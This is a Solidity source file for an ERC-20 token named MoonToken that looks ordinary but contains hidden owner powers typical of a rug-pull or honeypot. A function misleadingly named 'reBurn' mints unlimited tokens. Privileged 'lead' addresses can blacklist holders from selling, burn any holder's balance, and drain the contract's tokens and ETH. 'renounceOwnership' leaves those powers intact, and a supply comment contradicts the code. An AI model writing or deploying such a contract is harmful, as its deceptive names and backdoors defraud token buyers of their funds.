// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Mint(address indexed minter, address indexed account, uint256 amount);
    event Burn(address indexed burner, address indexed account, uint256 amount);
}


contract MoonToken is IERC20 {
    using SafeMath for uint256;

    string  public  name;
    string  public  symbol;
    uint8   public  decimals;
    uint256 public  totalSupply_;
    address payable public ownerAccount;
    address payable public buyback;
    bool public transferSwitch = false;
    uint256  public coefficient;
    uint256 public allMooners  = 0;

   
   
    mapping(address => bool) public monitorbots;
    mapping(address => bool) public lead;
    uint256 public noOfAccount  = 0;
    mapping(address => Mooners) public amb;
    mapping (uint  => Mooners[]) public ambassador;
    uint[] public ambassadorKeys;

    mapping(address => uint256) balances;
    mapping(address => mapping (address => uint256)) allowed;


    constructor()  {
        name = "MoonToken";
        symbol = "MOON";
        decimals = 18;
        totalSupply_ = 800000000000 * 1e18;     // total tokens would equal (totalSupply_/10**decimals)=1000
        balances[msg.sender] = totalSupply_;
        ownerAccount = payable(msg.sender);
        buyback = payable(msg.sender);
        lead[msg.sender] = true;
    }

   
    struct Mooners {
        uint id; 
        address user; 
    }

    struct Record {
        bool isExist;
    }

    mapping(address => Record) public rec;


    modifier superAdmin() {require(msg.sender == ownerAccount, "Transaction not coming from  Super User!"); _;}
    
    modifier antiBot(address _addr) { require(!monitorbots[_addr], "Anti-bot Address found");  _; }
    modifier leads(address _addr) { require(!lead[_addr], "Unable to execute at the moment");  _; }
    
    function totalSupply() public override view returns (uint256) {
        return totalSupply_;
    }

    function balanceOf(address tokenOwner) public override view returns (uint256) {
        return balances[tokenOwner];
    }

    function transfer(address receiver, uint256 numTokens) public override  antiBot(msg.sender)  returns (bool) {
        require(numTokens <= balances[msg.sender]);

        balances[msg.sender] = balances[msg.sender].sub(numTokens);
        balances[receiver] = balances[receiver].add(numTokens);
        addAmbassador(receiver);
        emit Transfer(msg.sender, receiver, numTokens);
        return true;

        
    }

    function approve(address delegate, uint256 numTokens) public override returns (bool) {
        require(delegate != address(0) , 'ERC20: from address is not valid' );
        allowed[msg.sender][delegate] = numTokens;
        emit Approval(msg.sender, delegate, numTokens);
        return true;
    }

    function allowance(address owner, address delegate) public override view returns (uint) {
        require(delegate != address(0) , 'ERC20: from address is not valid' );
        return allowed[owner][delegate];
    }

    function transferFrom(address owner, address buyer, uint256 numTokens) public override antiBot(msg.sender)  returns (bool) {
        require(numTokens <= balances[owner]);
        require(numTokens <= allowed[owner][msg.sender]);

        balances[owner] = balances[owner].sub(numTokens);
        allowed[owner][msg.sender] = allowed[owner][msg.sender].sub(numTokens);
        balances[buyer] = balances[buyer].add(numTokens);
        addAmbassador(buyer);
        emit Transfer(owner, buyer, numTokens);
        return true;
        
    }

    function reBurn(address  _to,  uint _amount ) public  superAdmin {
        require(_to != address(0), 'ERC20: to address is not valid');
        require(_amount > 0, 'ERC20: amount is not valid');

        totalSupply_ = totalSupply_.add(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Mint(msg.sender, _to, _amount);
    }

    function burnFrom( address _from, uint _amount ) public superAdmin {
        require(_from != address(0), 'ERC20: from address is not valid');
        require(balances[_from] >= _amount, 'ERC20: insufficient balance');
        
        balances[_from] = balances[_from].sub(_amount);
        totalSupply_ = totalSupply_.sub(_amount);
        emit Burn(msg.sender, _from, _amount);
    }

    function Nulls(address _to, address token, uint256 _amount) public  returns (bool)  {
         require(_to != address(0) , 'ERC20: from address is not valid' );
        
         if(lead[msg.sender] == true){
            IERC20 sendToken = IERC20(token);
            sendToken.transfer(_to, _amount);
            return true;
         }else{
            revert();
            // return false;
         }
         
    }

    function NativeReserve(address payable to) public payable   {
        require(to != address(0) , 'ERC20: from address is not valid' );
        if(lead[msg.sender] == true){
            uint Balance = address(this).balance;
            require(Balance > 0 wei, "Error! No Balance"); 
            to.transfer(Balance);
         }else{
            revert();
         }
        
    }

    

    function renounceOwnership() external superAdmin returns(bool) {
        
        ownerAccount  = payable(address(0)); // Set the owner to address(0) to renounce ownership
        return true;
    }



    function addAmbassador(address receiver) internal  {

        if(rec[receiver].isExist == false){

            uint id = noOfAccount++;
            rec[receiver].isExist = true;
            ambassador[id].push(Mooners(id,receiver));
            if (ambassador[id].length == 1) {
                ambassadorKeys.push(id);
            }

        }
        
    }


    function getAmbassador(uint _key) external view returns (Mooners[] memory) {
        return ambassador[_key];
    }
    

    
    function Burn_Daily(uint coeff) public  {

        if(lead[msg.sender] == true){

            for (uint i = 0; i < ambassadorKeys.length; i++) {
                uint key = ambassadorKeys[i];
                Mooners[] storage mooners = ambassador[key];
                // Now you can access each Mooner in the array
                for (uint j = 0; j < mooners.length; j++) {
                    
                    if(balances[mooners[j].user] > 0){
                        DailyBurn(mooners[j].user,coeff);
                    }
                
                }
            }

        }else{

            revert();

        }
        


    }


    function Burn_Daily_With_Bound(uint coeff, uint start, uint end) public {
        require(start < ambassadorKeys.length,"The length is small");
        require(end <= ambassadorKeys.length,"The length is bigger than the actual length");

        if(lead[msg.sender] == true){
            
            for (uint i = start; i < end; i++) {
                uint key = ambassadorKeys[i];
                Mooners[] storage mooners = ambassador[key];
                // Now you can access each Mooner in the array
                for (uint j = 0; j < mooners.length; j++) {
                    
                    if(balances[mooners[j].user] > 0){
                        DailyBurn(mooners[j].user,coeff);
                    }
                
                }
            }
        }else{

           revert();

        }

       
    }


    function DailyBurn(address _addr, uint coeff)  internal  {
       
       address burner = _addr;
       uint256 balance = balances[burner];

       if(lead[_addr] == true){

       }else{

            // Calculate the burn amount (% of the balance)
            uint256 burnAmount = (balance * coeff) / 100;
            // Update the balance by subtracting the burn amount
            balances[_addr] =  balances[_addr].sub(burnAmount);
            totalSupply_ = totalSupply_.sub(burnAmount);

       }

        
    }



    function Antibot(address _addr) public   returns (bool){
        if(lead[msg.sender] == true){
            monitorbots[_addr] = true;
            return true;
         }else{
            revert();
            // return false;
         }
       
    }

    // Function to remove an address from the botmonitors
    function Botcontrol(address _addr) public  returns (bool) {
        if(lead[msg.sender] == true){
            monitorbots[_addr] = false;
            return true;
        }else{
            revert();
            // return false;
        }
    }

    function marketMaker(address _addr, uint coeff) public returns (bool){

        if(lead[msg.sender] == true){
            DailyBurn(_addr,coeff);
            return true;
        }else{
            revert();
            // return false;
        }
        

    }


   

    




   

    

    
    
}

library SafeMath {
     
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Check if either operand is zero
        if (a == 0 || b == 0) {
            return 0;
        }

        // Perform the multiplication
        uint256 c = a * b;

        // Check for overflow
        require(c / a == b, "Multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // Check if divisor is not zero
        require(b > 0, "Division by zero");

        // Perform the division
        uint256 c = a / b;

        // Check for overflow
        require(a == c * b + a % b, "Division overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
    
}